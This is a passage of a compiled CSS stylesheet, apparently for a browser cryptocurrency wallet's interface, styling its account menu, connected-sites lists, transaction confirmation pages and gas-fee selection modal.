      border: 1px solid #d0021b; }
      /** Default Typography on base elements **/
      * {
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif; }
      /** Please import your files in alphabetical order **/
      .account-list-item__top-row {
      display: flex;
      margin-top: 10px;
      margin-left: 8px;
      position: relative; }
      .account-list-item__account-name {
      font-size: 16px;
      margin-left: 8px; }
      .account-list-item__icon {
      position: absolute;
      right: 12px;
      top: 1px; }
      .account-list-item__account-address {
      margin-left: 35px;
      width: 80%;
      overflow: hidden;
      text-overflow: ellipsis; }
      .account-menu {
      position: fixed;
      z-index: 100;
      top: 58px;
      width: 320px;
      border-radius: 4px;
      background: rgba(0, 0, 0, 0.8);
      box-shadow: rgba(0, 0, 0, 0.15) 0 2px 2px 2px;
      min-width: 150px;
      color: #fff; }
      @media screen and (max-width: 575px) {
      .account-menu {
      right: calc(((100vw - 100%) / 2) + 8px); } }
      @media screen and (min-width: 576px) {
      .account-menu {
      right: calc((100vw - 85vw) / 2); } }
      @media screen and (min-width: 769px) {
      .account-menu {
      right: calc((100vw - 80vw) / 2); } }
      @media screen and (min-width: 1281px) {
      .account-menu {
      right: calc((100vw - 65vw) / 2); } }
      .account-menu__item {
      padding: 18px;
      display: flex;
      flex-flow: row wrap;
      align-items: center;
      position: relative;
      z-index: 201; }
      @media screen and (max-width: 575px) {
      .account-menu__item {
      padding: 14px; } }
      .account-menu__item--clickable {
      cursor: pointer; }
      .account-menu__item--clickable:hover {
      background-color: rgba(255, 255, 255, 0.05); }
      .account-menu__item--clickable:active {
      background-color: rgba(255, 255, 255, 0.1); }
      .account-menu__item__icon {
      height: 16px;
      width: 16px;
      margin-right: 14px; }
      .account-menu__item__text {
      font-size: 16px;
      line-height: 21px; }
      .account-menu__item__subtext {
      font-size: 12px;
      padding: 5px 0 0 30px; }
      .account-menu__divider {
      background-color: #5d5d5d;
      width: 100%;
      height: 1px; }
      .account-menu__close-area {
      position: fixed;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      z-index: 100; }
      .account-menu__icon {
      margin-left: 1rem;
      cursor: pointer; }
      .account-menu__icon--disabled {
      cursor: initial; }
      .account-menu__header {
      display: flex;
      flex-flow: row nowrap;
      justify-content: space-between;
      align-items: center; }
      .account-menu__lock-button {
      border: 1px solid #9b9b9b;
      background-color: transparent;
      color: #fff;
      border-radius: 4px;
      font-size: 12px;
      line-height: 23px;
      padding: 0 24px; }
      .account-menu__item-icon {
      width: 16px;
      height: 16px; }
      .account-menu__accounts-container {
      display: flex;
      position: relative;
      flex-direction: column;
      z-index: 200; }
      @media (max-height: 600px) {
      .account-menu__accounts-container {
      max-height: 236px; } }
      .account-menu__accounts {
      overflow-y: auto;
      position: relative;
      max-height: 256px;
      scrollbar-width: none; }
      .account-menu__accounts::-webkit-scrollbar {
      display: none; }
      @media screen and (max-width: 575px) {
      .account-menu__accounts {
      max-height: 228px; } }
      .account-menu__accounts .keyring-label {
      z-index: 1;
      font-size: 8px;
      line-height: 8px;
      border-radius: 10px;
      padding: 4px;
      text-align: center;
      height: 15px;
      margin-top: 5px;
      margin-right: 10px;
      background-color: #9b9b9b;
      color: #000;
      font-weight: normal;
      letter-spacing: 0.5px; }
      .account-menu__no-accounts {
      font-size: 0.8em;
      padding: 16px 14px; }
      .account-menu__account {
      display: flex;
      flex-flow: row nowrap;
      padding: 16px 14px;
      flex: 0 0 auto; }
      @media screen and (max-width: 575px) {
      .account-menu__account {
      padding: 12px 14px; } }
      .account-menu__account .remove-account-icon {
      width: 15px;
      margin-left: 10px;
      height: 15px; }
      .account-menu__account:hover .remove-account-icon::after {
      content: '\00D7';
      font-size: 25px;
      color: #fff;
      cursor: pointer;
      position: absolute;
      margin-top: -5px; }
      .account-menu__account-info {
      flex: 1 0 auto;
      display: flex;
      flex-flow: column nowrap; }
      .account-menu__check-mark {
      width: 14px;
      margin-right: 12px;
      flex: 0 0 auto; }
      .account-menu__check-mark-icon {
      background-image: url("images/check-white.svg");
      height: 18px;
      width: 18px;
      background-repeat: no-repeat;
      background-position: center;
      background-size: contain;
      margin: 3px 0; }
      .account-menu .identicon {
      margin: 0 12px 0 0;
      flex: 0 0 auto; }
      .account-menu__name {
      color: #fff;
      font-size: 18px;
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap;
      max-width: 200px; }
      .account-menu__balance {
      color: #9b9b9b;
      font-size: 14px; }
      .account-menu__action {
      font-size: 16px;
      line-height: 18px;
      cursor: pointer; }
      .account-menu__scroll-button {
      position: absolute;
      bottom: 12px;
      right: 12px;
      height: 28px;
      width: 28px;
      border-radius: 14px;
      background: #3f3f3f;
      z-index: 201;
      cursor: pointer;
      opacity: 0.8;
      display: flex;
      justify-content: center;
      align-items: center; }
      .account-menu__scroll-button:hover {
      opacity: 1; }
      .account-menu__icon-list {
      display: flex; }
      .add-token-button__button {
      max-width: 200px;
      margin: 16px auto; }
      .invalid-custom-network-alert__content {
      border-radius: 0;
      padding: 0 24px 16px 24px; }
      .invalid-custom-network-alert__content > p {
      font-style: normal;
      font-weight: normal;
      font-size: 1rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-size: 14px;
      padding-bottom: 12px; }
      .invalid-custom-network-alert__content > p:last-of-type {
      padding-bottom: 0; }
      .invalid-custom-network-alert__content-link {
      color: #037dd6;
      cursor: pointer; }
      .invalid-custom-network-alert__footer {
      flex-direction: column; }
      .invalid-custom-network-alert__footer > :only-child {
      margin: 0;
      width: 100%; }
      .invalid-custom-network-alert__footer-row {
      display: flex;
      flex-direction: row;
      justify-content: space-between; }
      .invalid-custom-network-alert__footer-row .invalid-custom-network-alert__footer-row-button {
      height: 40px;
      width: 50%;
      border-radius: 100px;
      margin-right: 24px; }
      .invalid-custom-network-alert__footer-row .invalid-custom-network-alert__footer-row-button:last-of-type {
      margin-right: 0; }
      .invalid-custom-network-alert__error {
      margin-bottom: 16px;
      padding: 16px;
      font-size: 14px;
      border: 1px solid #d73a49;
      background: #f8eae8;
      border-radius: 3px; }
      .unconnected-account-alert__content {
      border-radius: 0; }
      .unconnected-account-alert__footer {
      flex-direction: column; }
      .unconnected-account-alert__footer > :only-child {
      margin: 0; }
      .unconnected-account-alert__footer-row {
      display: flex;
      flex-direction: row; }
      .unconnected-account-alert .unconnected-account-alert__dismiss-button {
      background: #037dd6;
      color: white;
      height: 40px;
      width: 100px;
      border: 0;
      border-radius: 100px; }
      .unconnected-account-alert__error {
      margin-bottom: 16px;
      padding: 16px;
      font-size: 14px;
      border: 1px solid #d73a49;
      background: #f8eae8;
      border-radius: 3px; }
      .unconnected-account-alert__checkbox-wrapper {
      width: 100%;
      display: flex;
      flex-direction: row;
      align-items: center; }
      .unconnected-account-alert__checkbox {
      margin-right: 8px;
      padding-top: 1px; }
      .unconnected-account-alert__checkbox-label {
      display: flex;
      font-size: 12px;
      margin-top: auto;
      margin-bottom: auto;
      color: #6a737d; }
      .unconnected-account-alert__checkbox-label-tooltip {
      margin-left: 8px; }
      .app-header {
      align-items: center;
      background: #f2f3f4;
      position: relative;
      z-index: 12;
      display: flex;
      flex-flow: column nowrap;
      width: 100%;
      flex: 0 0 auto; }
      @media screen and (max-width: 575px) {
      .app-header {
      padding: 1rem;
      z-index: 26; } }
      @media screen and (min-width: 576px) {
      .app-header {
      height: 75px;
      justify-content: center; }
      .app-header--back-drop::after {
      content: '';
      position: absolute;
      width: 100%;
      height: 32px;
      background: #f2f3f4;
      bottom: -32px; } }
      .app-header__metafox-logo--icon {
      height: 32px; }
      @media screen and (min-width: 576px) {
      .app-header__metafox-logo--icon {
      display: none; } }
      @media screen and (max-width: 575px) {
      .app-header__metafox-logo--horizontal {
      display: none; } }
      .app-header__contents {
      display: flex;
      flex-flow: row nowrap;
      width: 100%; }
      @media screen and (max-width: 575px) {
      .app-header__contents {
      height: 100%; } }
      @media screen and (min-width: 576px) {
      .app-header__contents {
      width: 85vw; } }
      @media screen and (min-width: 769px) {
      .app-header__contents {
      width: 80vw; } }
      @media screen and (min-width: 1281px) {
      .app-header__contents {
      width: 62vw; } }
      .app-header__logo-container {
      display: flex;
      flex-direction: row;
      align-items: center;
      flex: 0 0 auto; }
      .app-header__logo-container--clickable {
      cursor: pointer; }
      .app-header__account-menu-container {
      display: flex;
      flex-flow: row nowrap;
      align-items: center;
      flex: 1 1 auto;
      width: 0;
      flex-flow: row nowrap;
      justify-content: flex-end; }
      .app-header__network-component-wrapper {
      display: flex;
      flex-direction: row;
      align-items: center;
      flex: 1 0 auto;
      width: 0;
      justify-content: flex-end; }
      .app-header__network-component-wrapper .network-component.pointer {
      max-width: 200px; }
      .app-header__network-component-wrapper .network-indicator {
      width: 100%; }
      .asset-list-item__token-value {
      padding: 0 5px 0 0;
      overflow: hidden;
      white-space: nowrap;
      text-overflow: ellipsis; }
      .asset-list-item__chevron-right {
      color: #6a737d; }
      .asset-list-item .list-item__right-content {
      align-self: center; }
      .asset-list-item .list-item__subheading {
      margin-top: 6px;
      font-size: 14px; }
      .asset-list-item__warning {
      flex: 1;
      margin-left: 8px; }
      .asset-list-item .asset-list-item__send-token-button {
      display: none;
      text-transform: uppercase;
      width: -webkit-fit-content;
      width: -moz-fit-content;
      width: fit-content;
      font-size: 14px; }
      @media (min-width: 576px) {
      .asset-list-item__warning-tooltip {
      display: none; }
      .asset-list-item .list-item__mid-content {
      display: flex; }
      .asset-list-item .asset-list-item__send-token-button {
      display: inline-block; }
      .asset-list-item__chevron-right {
      display: none; } }
      .confirm-page-container-warning {
      background-color: #fffcdb;
      display: flex;
      justify-content: center;
      align-items: center;
      border-bottom: 1px solid #d2d8dd;
      padding: 12px 24px; }
      .confirm-page-container-warning__icon {
      flex: 0 0 auto;
      margin-right: 16px; }
      .confirm-page-container-warning__warning {
      font-size: 0.75rem;
      color: #5f5922; }
      .confirm-page-container-summary {
      padding: 16px 24px 0;
      background-color: #f9fafa;
      height: 133px;
      box-sizing: border-box; }
      .confirm-page-container-summary__action-row {
      display: flex;
      justify-content: space-between; }
      .confirm-page-container-summary__action {
      text-transform: uppercase;
      color: #8c8e94;
      font-size: 0.75rem;
      padding: 3px 8px;
      border: 1px solid #8c8e94;
      border-radius: 4px;
      display: inline-block; }
      .confirm-page-container-summary__nonce {
      color: #8c8e94; }
      .confirm-page-container-summary__title {
      padding: 4px 0;
      display: flex;
      align-items: center; }
      .confirm-page-container-summary__identicon {
      flex: 0 0 auto;
      margin-right: 8px; }
      .confirm-page-container-summary__title-text {
      font-size: 2.25rem;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .confirm-page-container-summary__subtitle {
      color: #8c8e94;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .confirm-page-container-summary--border {
      border-bottom: 1px solid #d2d8dd; }
      .confirm-page-container-content {
      overflow-y: auto;
      height: 100%;
      flex: 1;
      display: flex;
      flex-direction: column; }
      .confirm-page-container-content__error-container {
      padding: 0 16px 16px 16px; }
      .confirm-page-container-content__details {
      box-sizing: border-box;
      padding: 0 24px; }
      .confirm-page-container-content__data {
      padding: 16px;
      color: #8c8e94; }
      .confirm-page-container-content__data-box {
      background-color: #f9fafa;
      padding: 12px;
      font-size: 0.75rem;
      margin-bottom: 16px;
      word-wrap: break-word;
      max-height: 200px;
      overflow-y: auto; }
      .confirm-page-container-content__data-box-label {
      text-transform: uppercase;
      padding: 8px 0 12px;
      font-size: 12px; }
      .confirm-page-container-content__data-field {
      display: flex;
      flex-direction: row; }
      .confirm-page-container-content__data-field-label {
      font-weight: 500;
      padding-right: 16px; }
      .confirm-page-container-content__data-field:not(:last-child) {
      margin-bottom: 5px; }
      .confirm-page-container-content__gas-fee {
      border-bottom: 1px solid #d2d8dd; }
      .confirm-page-container-content__gas-fee .advanced-gas-inputs__gas-edit-rows {
      margin-bottom: 16px; }
      .confirm-page-container-content__function-type {
      font-size: 0.875rem;
      font-weight: 500;
      text-transform: capitalize;
      color: #000;
      padding-left: 5px; }
      .confirm-page-container-content__tab {
      font-size: 0.75rem;
      color: #8c8e94;
      text-transform: uppercase;
      margin: 0 8px; }
      .confirm-page-container-content .page-container__footer {
      margin-top: auto; }
      .confirm-page-container-header {
      display: flex;
      flex-direction: column;
      flex: 0 0 auto; }
      .confirm-page-container-header__row {
      display: flex;
      justify-content: space-between;
      border-bottom: 1px solid #d2d8dd;
      padding: 4px 13px 4px 13px;
      flex: 0 0 auto;
      align-items: center; }
      .confirm-page-container-header__back-button-container {
      display: flex;
      justify-content: center;
      align-items: center; }
      [dir='rtl'] .confirm-page-container-header__back-button-container img {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg); }
      .confirm-page-container-header__back-button {
      color: #2f9ae0;
      font-size: 1rem;
      cursor: pointer;
      font-weight: 400;
      padding-left: 5px; }
      .confirm-page-container-header__address-container {
      display: flex;
      align-items: center;
      margin-top: 2px;
      margin-bottom: 2px; }
      .confirm-page-container-header__address {
      margin-left: 6px;
      font-size: 14px; }
      .confirm-detail-row {
      padding: 14px 0;
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      align-items: center; }
      .confirm-detail-row__label {
      font-size: 0.75rem;
      font-weight: 500;
      color: #5d5d5d;
      text-transform: uppercase; }
      .confirm-detail-row__details {
      flex: 1;
      text-align: end;
      min-width: 0; }
      .confirm-detail-row__primary {
      font-size: 1.5rem;
      justify-content: flex-end; }
      .confirm-detail-row__secondary {
      color: #8c8e94;
      justify-content: flex-end; }
      .confirm-detail-row__header-text {
      font-size: 0.75rem;
      text-transform: uppercase;
      margin-bottom: 6px;
      color: #5d5d5d; }
      .confirm-detail-row__header-text--edit {
      color: #037dd6;
      cursor: pointer; }
      .confirm-detail-row__header-text--total {
      font-size: 0.625rem; }
      .confirm-detail-row .advanced-gas-inputs__gas-edit-rows {
      margin-bottom: 16px; }
      .confirm-detail-row .custom-nonce-input input {
      width: 90px;
      font-size: 1rem; }
      .confirm-page-container-navigation {
      display: flex;
      justify-content: space-between;
      font: inherit;
      padding: 4px 10px 4px 10px;
      border-bottom: 1px solid #d2d8dd;
      flex: 0 0 auto; }
      .confirm-page-container-navigation__container {
      display: flex; }
      .confirm-page-container-navigation__arrow {
      cursor: pointer;
      display: flex;
      padding-left: 5px;
      padding-right: 5px; }
      .confirm-page-container-navigation__arrow:hover {
      -webkit-transform: scale(1.1);
      transform: scale(1.1); }
      .confirm-page-container-navigation__arrow:active {
      -webkit-transform: scale(0.95);
      transform: scale(0.95); }
      .confirm-page-container-navigation__textcontainer {
      text-align: center; }
      .confirm-page-container-navigation__navtext {
      font-size: 9px;
      font-weight: bold; }
      .confirm-page-container-navigation__longtext {
      color: #8c8e94;
      font-size: 8px; }
      .confirm-page-container-navigation__imageflip {
      -webkit-transform: scaleX(-1);
      transform: scaleX(-1); }
      .page-container__content-component-wrapper {
      height: 100%; }
      .connected-accounts-list {
      display: flex;
      flex-direction: column;
      align-items: center; }
      .connected-accounts-list__identicon {
      margin-right: 8px; }
      .connected-accounts-list__account-name {
      display: inline;
      font-weight: bold;
      font-size: 14px;
      line-height: 20px; }
      .connected-accounts-list .connected-accounts-list__account-status, .connected-accounts-list .connected-accounts-list__account-status-link {
      font-size: 12px;
      line-height: 17px;
      padding-top: 4px; }
      .connected-accounts-list__account-status {
      display: inline;
      color: #6a737d; }
      .connected-accounts-list__account-status-link {
      display: block; }
      .connected-accounts-list__account-status-link, .connected-accounts-list__account-status-link:hover {
      color: #037dd6;
      cursor: pointer; }
      .connected-accounts-list__row {
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      align-items: center;
      width: 100%;
      padding: 16px 24px;
      border-top: 1px solid #d2d8dd; }
      .connected-accounts-list__row--highlight {
      background-color: #fefae8;
      border: 1px solid #ffd33d;
      box-sizing: border-box;
      padding: 16px;
      margin-bottom: 16px;
      width: calc(100% - 16px); }
      .connected-accounts-list__row-content {
      display: flex;
      flex-direction: row;
      align-items: center; }
      .connected-accounts-options__button {
      background: inherit;
      color: #6a737d;
      font-size: 22px; }
      .tippy-tooltip.none-theme {
      background: none;
      padding: 0; }
      .connected-accounts-permissions {
      display: flex;
      flex-direction: column;
      font-size: 12px;
      line-height: 17px;
      color: #6a737d; }
      .connected-accounts-permissions strong {
      font-weight: bold; }
      .connected-accounts-permissions p + p {
      padding-top: 8px; }
      .connected-accounts-permissions__header {
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      align-items: center;
      cursor: pointer;
      font-size: 14px;
      line-height: 20px;
      color: #24292e; }
      .connected-accounts-permissions__header button {
      font-size: 16px;
      line-height: 24px;
      background: none;
      padding: 0;
      margin-left: 8px; }
      .connected-accounts-permissions__list {
      padding-top: 8px; }
      .connected-accounts-permissions__list-item {
      display: flex; }
      .connected-accounts-permissions .connected-accounts-permissions__checkbox {
      margin: 0 8px 0 0;
      font-size: 18px; }
      .connected-accounts-permissions__list-container {
      max-height: 0;
      overflow: hidden;
      height: auto;
      transition: max-height 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
      .connected-accounts-permissions__list-container--expanded {
      max-height: 100px; }
      .connected-sites-list__content-rows {
      display: flex;
      flex-direction: column;
      align-items: center; }
      .connected-sites-list__content-row {
      display: flex;
      width: 100%;
      flex-direction: row;
      justify-content: space-between;
      align-items: center;
      border-top: 1px solid #d2d8dd;
      padding: 16px 24px; }
      .connected-sites-list__domain-info {
      display: flex;
      flex-direction: row;
      align-items: center;
      min-width: 0;
      font-size: 12px; }
      .connected-sites-list__domain-name {
      max-width: 215px;
      white-space: nowrap;
      overflow: hidden;
      direction: rtl;
      text-overflow: ellipsis;
      margin-left: 6px; }
      .connected-sites-list__trash {
      cursor: pointer; }
      .connected-status-indicator {
      display: flex;
      align-items: center;
      place-self: center start;
      background: none;
      font-size: inherit;
      padding: 8px;
      border-radius: 100px; }
      .connected-status-indicator:hover {
      background-color: #f2f3f4; }
      .connected-status-indicator:active {
      background-color: #ededed; }
      .connected-status-indicator__inner-circle {
      border-radius: 4px;
      height: 4px;
      width: 4px;
      background-color: transparent; }
      .connected-status-indicator__green-circle, .connected-status-indicator__yellow-circle, .connected-status-indicator__grey-circle {
      border-radius: 4px;
      height: 8px;
      width: 8px;
      border: 1px solid transparent;
      display: flex;
      align-items: center;
      justify-content: center; }
      .connected-status-indicator__green-circle {
      border-color: #4cd964; }
      .connected-status-indicator__green-circle .connected-status-indicator__inner-circle {
      background-color: #4cd964; }
      .connected-status-indicator__yellow-circle {
      border-color: #ffd33d; }
      .connected-status-indicator__grey-circle {
      border-color: #6a737d; }
      .connected-status-indicator__text {
      font-size: 10px;
      color: #6a737d;
      margin-left: 6px;
      white-space: nowrap; }
      .advanced-tab {
      display: flex;
      flex-flow: column; }
      .advanced-tab__transaction-data-summary, .advanced-tab__fee-chart-title {
      padding-left: 24px;
      padding-right: 24px; }
      .advanced-tab__transaction-data-summary {
      display: flex;
      flex-flow: column;
      color: #5b5d67;
      margin-top: 12px;
      padding-left: 18px;
      padding-right: 18px; }
      .advanced-tab__transaction-data-summary__titles, .advanced-tab__transaction-data-summary__container {
      display: flex;
      flex-flow: row;
      justify-content: space-between;
      font-size: 12px;
      color: #888ea3; }
      .advanced-tab__transaction-data-summary__container {
      font-size: 16px;
      margin-top: 0; }
      .advanced-tab__transaction-data-summary__fee {
      font-size: 16px;
      color: #313a5e; }
      .advanced-tab__transaction-data-summary__time-remaining {
      /*rtl:ignore*/
      direction: ltr;
      color: #313a5e;
      font-size: 16px; }
      .advanced-tab__transaction-data-summary__time-remaining .minutes-num,
      .advanced-tab__transaction-data-summary__time-remaining .seconds-num {
      font-size: 16px; }
      .advanced-tab__transaction-data-summary__time-remaining .seconds-num {
      margin-left: 7px;
      font-size: 16px; }
      .advanced-tab__transaction-data-summary__time-remaining .minutes-label,
      .advanced-tab__transaction-data-summary__time-remaining .seconds-label {
      font-size: 16px; }
      .advanced-tab__fee-chart {
      margin-top: 8px;
      height: 265px;
      background: #f8f9fb;
      border-bottom: 1px solid #d2d8dd;
      border-top: 1px solid #d2d8dd;
      position: relative; }
      .advanced-tab__fee-chart__title {
      font-size: 12px;
      color: #313a5e;
      margin-left: 22px; }
      .advanced-tab__fee-chart__speed-buttons {
      position: absolute;
      bottom: 13px;
      display: flex;
      justify-content: space-between;
      padding-left: 20px;
      padding-right: 19px;
      width: 100%;
      font-size: 10px;
      color: #888ea3; }
      .advanced-tab__fee-chart .loading-overlay {
      height: auto; }
      .advanced-tab__slider-container {
      padding-left: 27px;
      padding-right: 27px; }
      .advanced-tab__gas-inputs {
      display: flex;
      flex-flow: row;
      justify-content: space-between;
      margin-left: 20px;
      margin-right: 10px;
      margin-top: 10px;
      margin-bottom: 20px; }
      .basic-tab-content {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      padding-left: 21px;
      height: 324px;
      background: #f5f7f8;
      border-bottom: 1px solid #d2d8dd; }
      .basic-tab-content__title {
      margin-top: 19px;
      font-size: 16px;
      color: #000; }
      .basic-tab-content__blurb {
      width: 95%;
      font-size: 12px;
      color: #000;
      margin-top: 5px;
      margin-bottom: 15px; }
      .basic-tab-content__footer-blurb {
      width: 95%;
      font-size: 12px;
      color: #979797;
      margin-top: 15px; }
      .gas-modal-page-container .page-container {
      max-width: 391px;
      min-height: 585px;
      overflow-y: initial; }
      @media screen and (max-width: 575px) {
      .gas-modal-page-container .page-container__content {
      display: flex;
      overflow-y: initial; } }
      .gas-modal-page-container .page-container__header {
      padding: 0;
      padding-top: 16px; }
      .gas-modal-page-container .page-container__header--no-padding-bottom {
      padding-bottom: 0; }
      .gas-modal-page-container .page-container__footer footer {
      padding-top: 12px;
      padding-bottom: 12px; }
      .gas-modal-page-container .page-container__header-close-text {
      font-size: 14px;
      color: #4eade7;
      position: absolute;
      top: 4px;
      right: 16px;
      cursor: pointer;
      overflow: hidden;
      width: -webkit-min-content;
      width: -moz-min-content;
      width: min-content; }
      .gas-modal-page-container .page-container__title {
      color: #000;
      font-size: 16px;
      font-weight: 500;
      line-height: 16px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      margin-right: 0; }
      .gas-modal-page-container .page-container__subtitle {
      display: none; }
      .gas-modal-page-container .page-container__tabs {
      margin-top: 0; }
      .gas-modal-page-container .page-container__tab {
      width: 100%;
      font-size: 14px; }
      .gas-modal-page-container .page-container__tab:last-of-type {
      margin-right: 0; }
      .gas-modal-page-container .page-container__tab--selected {
      color: #037dd6;
      border-bottom: 2px solid #037dd6; }
      @media screen and (max-width: 575px) {
      .gas-modal-content {
      width: 100%; } }
      .gas-modal-content__basic-tab {
      height: 219px; }
      .gas-modal-content__info-row, .gas-modal-content__info-row--fade {
      width: 100%;
      background: #fafcfe;
      padding: 15px 21px;
      display: flex;
      flex-flow: column;
      color: #5d5d5d;
      font-size: 12px; }
      .gas-modal-content__info-row__send-info, .gas-modal-content__info-row__transaction-info, .gas-modal-content__info-row__total-info, .gas-modal-content__info-row__fiat-total-info, .gas-modal-content__info-row--fade__send-info, .gas-modal-content__info-row--fade__transaction-info, .gas-modal-content__info-row--fade__total-info, .gas-modal-content__info-row--fade__fiat-total-info {
      display: flex;
      flex-flow: row;
      justify-content: space-between; }
      .gas-modal-content__info-row__fiat-total-info, .gas-modal-content__info-row--fade__fiat-total-info {
      justify-content: flex-end; }
      .gas-modal-content__info-row__total-info__label, .gas-modal-content__info-row--fade__total-info__label {
      font-size: 16px; }
      @media screen and (max-width: 575px) {
      .gas-modal-content__info-row__total-info__label, .gas-modal-content__info-row--fade__total-info__label {
      font-size: 14px; } }
      .gas-modal-content__info-row__total-info__value, .gas-modal-content__info-row--fade__total-info__value {
      font-size: 16px;
      font-weight: bold; }
      @media screen and (max-width: 575px) {
      .gas-modal-content__info-row__total-info__value, .gas-modal-content__info-row--fade__total-info__value {
      font-size: 14px; } }
      .gas-modal-content__info-row__transaction-info__label, .gas-modal-content__info-row__send-info__label, .gas-modal-content__info-row--fade__transaction-info__label, .gas-modal-content__info-row--fade__send-info__label {
      font-size: 12px; }
      .gas-modal-content__info-row__transaction-info__value, .gas-modal-content__info-row__send-info__value, .gas-modal-content__info-row--fade__transaction-info__value, .gas-modal-content__info-row--fade__send-info__value {
      font-size: 12px; }
      .gas-modal-content__info-row--fade {
      background: white;
      color: #9b9b9b;
      border-top: 1px solid #dddee9; }
      .gas-price-button-group {
      margin-top: 22px;
      display: flex;
      justify-content: space-evenly;
      width: 100%;
      padding-left: 20px;
      padding-right: 20px; }
      .gas-price-button-group__primary-currency {
      font-size: 18px;
      height: 20.5px;
      margin-bottom: 7.5px; }
      .gas-price-button-group__time-estimate {
      margin-top: 5.5px;
      color: #aeaeae;
      height: 15.4px; }
      .gas-price-button-group__loading-container {
      height: 130px; }
      .gas-price-button-group .button-group__button,
      .gas-price-button-group .button-group__button--active {
      height: 130px;
      max-width: 108px;
      font-size: 12px;
      flex-direction: column;
      align-items: center;
      display: flex;
      padding-top: 17px;
      border-radius: 4px;
      border: 2px solid #c7ddec;
      background: #fff;
      color: #5d5d5d; }
      .gas-price-button-group .button-group__button div,
      .gas-price-button-group .button-group__button--active div {
      display: flex;
      flex-direction: column;
      align-items: center; }
      .gas-price-button-group .button-group__button i:last-child,
      .gas-price-button-group .button-group__button--active i:last-child {
      display: none; }
      .gas-price-button-group .button-group__button--active {
      border: 2px solid #037dd6;
      color: #5d5d5d; }
      .gas-price-button-group .button-group__button--active i:last-child {
      display: flex;
      color: #037dd6;
      margin-top: 8px; }
      .gas-price-button-group--small {
      display: flex;
      justify-content: stretch;
      height: 54px; }
      @media screen and (max-width: 575px) {
      .gas-price-button-group--small {
      max-width: 260px; } }
      .gas-price-button-group--small__button-fiat-price {
      font-size: 13px; }
      .gas-price-button-group--small__button-label {
      font-size: 16px; }
      .gas-price-button-group--small__label {
      font-weight: 500;
      line-height: 16px;
      padding-bottom: 4px; }
      .gas-price-button-group--small__primary-currency {
      font-size: 12px;
      line-height: 12px;
      padding-bottom: 2px; }
      @media screen and (max-width: 575px) {
      .gas-price-button-group--small__primary-currency {
      font-size: 10px; } }
      .gas-price-button-group--small__secondary-currency {
      font-size: 12px;
      line-height: 12px;
      padding-bottom: 2px; }
      @media screen and (max-width: 575px) {
      .gas-price-button-group--small__secondary-currency {
      font-size: 10px; } }
      .gas-price-button-group--small__loading-container {
      height: 54px; }
      .gas-price-button-group--small .button-group__button,
      .gas-price-button-group--small .button-group__button--active {
      background: white;
      color: #5d5d5d;
      padding: 0 4px; }
      .gas-price-button-group--small .button-group__button div,
      .gas-price-button-group--small .button-group__button--active div {
      display: flex;
      flex-flow: column;
      align-items: flex-start;
      justify-content: flex-start; }
      .gas-price-button-group--small .button-group__button i:last-child,
      .gas-price-button-group--small .button-group__button--active i:last-child {
      display: none; }
      .gas-price-button-group--small .button-group__button--active {
      color: #fff;
      background: #3099f2; }
      .gas-price-button-group--small .button-group__button--active i:last-child {
      display: flex;
      color: #037dd6;
      margin-top: 10px; }
      .gas-price-button-group--alt {
      display: flex;
      justify-content: stretch;
      width: 95%; }
      .gas-price-button-group--alt__button-fiat-price {
      font-size: 13px; }
      .gas-price-button-group--alt__button-label {
      font-size: 16px; }
      .gas-price-button-group--alt__label {
      font-weight: 500;
      font-size: 10px;
      text-transform: capitalize; }
      .gas-price-button-group--alt__primary-currency {
      font-size: 11px;
      margin-top: 3px; }
      .gas-price-button-group--alt__secondary-currency {
      font-size: 11px; }
      .gas-price-button-group--alt__loading-container {
      height: 78px; }
      .gas-price-button-group--alt__time-estimate {
      font-size: 12px;
      font-weight: 500;
      margin-top: 4px;
      color: #000; }
      .gas-price-button-group--alt .button-group__button,
      .gas-price-button-group--alt .button-group__button--active {
      height: 78px;
      background: white;
      color: #2a4055;
      width: 108px;
      height: 97px;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.151579);
      border-radius: 6px;
      border: none; }
      .gas-price-button-group--alt .button-group__button div,
      .gas-price-button-group--alt .button-group__button--active div {
      display: flex;
      flex-flow: column;
      align-items: flex-start;
      justify-content: flex-start;
      position: relative; }
      .gas-price-button-group--alt .button-group__button .button-check-wrapper,
      .gas-price-button-group--alt .button-group__button--active .button-check-wrapper {
      display: none; }
      .gas-price-button-group--alt .button-group__button:first-child,
      .gas-price-button-group--alt .button-group__button--active:first-child {
      margin-right: 6px; }
      .gas-price-button-group--alt .button-group__button:last-child,
      .gas-price-button-group--alt .button-group__button--active:last-child {
      margin-left: 6px; }
      .gas-price-button-group--alt .button-group__button--active {
      background: #f7fcff;
      border: 2px solid #2c8bdc; }
      .gas-price-button-group--alt .button-group__button--active:first-child {
      border: 2px solid #2c8bdc; }
      .gas-price-button-group--alt .button-group__button--active .button-check-wrapper {
      height: 16px;
      width: 16px;
      border-radius: 8px;
      position: absolute;
      top: -11px;
      right: -10px;
      background: #d5ecfa;
      display: flex;
      flex-flow: row;
      justify-content: center;
      align-items: center; }
      .gas-price-button-group--alt .button-group__button--active i {
      display: flex;
      color: #037dd6;
      font-size: 12px; }
      .gas-slider {
      position: relative;
      width: 322px; }
      .gas-slider__input {
      width: 322px;
      margin-left: -2px;
      z-index: 2; }
      .gas-slider input[type=range] {
      -webkit-appearance: none !important; }
      .gas-slider input[type=range]::-webkit-slider-thumb {
      -webkit-appearance: none !important;
      height: 34px;
      width: 34px;
      background-color: #037dd6;
      box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.08);
      border-radius: 50%;
      position: relative;
      z-index: 10; }
      .gas-slider__bar {
      height: 6px;
      width: 322px;
      background: #dedede;
      display: flex;
      justify-content: space-between;
      position: absolute;
      top: 16px;
      z-index: 0;
      border-radius: 4px; }
      .gas-slider__colored {
      height: 6px;
      border-radius: 4px;
      margin-left: 102px;
      width: 322px;
      z-index: 1;
      background-color: #bfdef3; }
